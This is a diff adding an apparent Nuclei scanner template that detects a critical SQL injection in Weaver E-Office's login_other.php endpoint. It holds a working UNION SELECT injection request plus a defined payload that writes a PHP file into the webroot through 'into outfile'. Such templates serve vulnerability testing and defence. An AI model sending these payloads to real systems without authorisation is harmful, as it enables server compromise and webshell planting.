@@ -1,0 +1,48 @@
+id: eoffice-login_other-sqli
+
+info:
+  name: OA E-Office group_xml.php - SQL Injection
+  author: SleepingBag945
+  severity: critical
+  description: |
+    There is a SQL injection vulnerability in the Panwei OA E-Office group_xml.php file. Through the vulnerability, an attacker can write to the Webshell file to obtain server permissions.
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/泛微OA/泛微OA%20E-Office%20group_xml.php%20SQL注入漏洞.html
+    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Office%20group_xml.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: weaver
+    product: e-office
+    fofa-query: app="泛微-EOffice"
+  tags: weaver,e-office,oa,sqli,vuln
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  string: "weaver-group-xml-sqli"
+  payload: "[group]:[1]|[groupid]:[1 union select '<?php echo md5(\"{{string}}\");unlink(__FILE__);?>',2,3,4,5,6,7,8 into outfile '../webroot/{{filename}}.php']"
+
+http:
+  - raw:
+      - |
+        GET /E-mobile/Data/login_other.php?diff=sync&auth={"auths":[{"value":"-1'+UNION+SELECT+1,2,md5(123),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23"}]} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+        Cache-Control: no-cache
+        Pragma: no-cache
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70"
+
+      - type: status
+        status:
+          - 200
+# digest: 490a00463044022068293e6d3dbfd8549c9788088d708b2c13534f1071ee3b2c6ae626ca11e0b86a0220423aeffcb8c053abac141a0e9fd2b6c19d033aaaa21b04beff4534225a2059b4:922c64590222798bb761d5b6d8e72950
